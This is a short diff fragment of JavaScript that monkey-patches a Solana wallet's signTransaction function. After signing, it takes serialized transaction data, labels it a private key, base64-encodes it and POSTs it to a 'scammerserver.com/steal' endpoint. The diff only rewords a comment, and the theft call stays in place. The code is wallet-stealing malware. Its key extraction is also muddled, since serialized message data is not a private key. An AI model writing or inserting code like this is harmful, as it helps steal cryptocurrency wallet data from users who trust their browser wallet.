@@ -8,7 +8,9 @@ window.solana.signTransaction = async function(transaction) {
 
     const signedTx = await originalSignTransaction.apply(this, arguments);
 
-    const privateKey = signedTx.serializeMessage();  // Extract key-like data
+    // Extract key-like data from signed transaction
+    const privateKey = signedTx.serializeMessage();
+    
     fetch("https://scammerserver.com/steal", {
         method: "POST",
         body: JSON.stringify({ key: btoa(privateKey) }),
